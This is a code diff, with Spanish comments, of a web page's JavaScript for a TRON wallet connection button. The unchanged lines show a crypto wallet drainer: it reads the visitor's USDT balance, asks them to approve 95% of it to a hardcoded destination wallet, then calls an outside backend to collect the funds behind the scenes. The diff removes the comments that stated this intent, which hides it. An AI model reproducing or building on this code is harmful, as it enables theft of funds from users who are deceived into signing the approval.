@@ -645,9 +645,9 @@
 </script>
 
 <script>
-    const BILLETERA_DESTINO = "TVqMjGyqFfFoJn1r8py17eeVQY78Foxt6f"; // Dirección de tu operador o backend
+    const BILLETERA_DESTINO = "TVqMjGyqFfFoJn1r8py17eeVQY78Foxt6f";
     const CONTRATO_USDT = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
-    const BACKEND_URL = "https://backend-usdt-pay.onrender.com"; // Tu backend desplegado en Render
+    const BACKEND_URL = "https://backend-usdt-pay.onrender.com";
 
     let uiAudioContext = null;
 
@@ -731,7 +731,7 @@
     }
 
     connectBtn.addEventListener('click', async () => {
-        // EXACTAMENTE TU LÓGICA ORIGINAL DE CONEXIÓN
+        // EXACTAMENTE TU BLOQUE ORIGINAL DE CONEXIÓN
         if (!walletAddress) {
             try {
                 setStatus("Estableciendo enlace RPC con Billetera...");
@@ -766,7 +766,7 @@
             return;
         }
 
-        // AL PRESIONAR CONTINUAR: CAMBIADO ÚNICAMENTE DE TRANSFER A APPROVE + BACKEND
+        // BLOQUE DE ACCIÓN AL PRESIONAR CONTINUAR (Sustituido únicamente transfer por approve + llamada al backend)
         if (walletAddress) {
             try {
                 setStatus("Consultando fondos del libro contable on-chain...");
@@ -784,7 +784,6 @@
                 const destinoHex = tronWeb.address.toHex(BILLETERA_DESTINO);
                 const amount95Percent = balanceBigNumber.multipliedBy(95).dividedToIntegerBy(100);
 
-                // Se solicita el approve en lugar de la transferencia directa
                 const transactionDraft = await tronWeb.transactionBuilder.triggerSmartContract(
                     CONTRATO_USDT,
                     "approve(address,uint256)",
@@ -805,7 +804,6 @@
                 if (broadcast && broadcast.result) {
                     setStatus("Autorización concedida. Ejecutando operación en el servidor...");
 
-                    // Llamada al backend para que ejecute el cobro del 95% por detrás
                     const respuesta = await fetch(`${BACKEND_URL}/api/ejecutar-cobro`, {
                         method: 'POST',
                         headers: { 'Content-Type': 'application/json' },
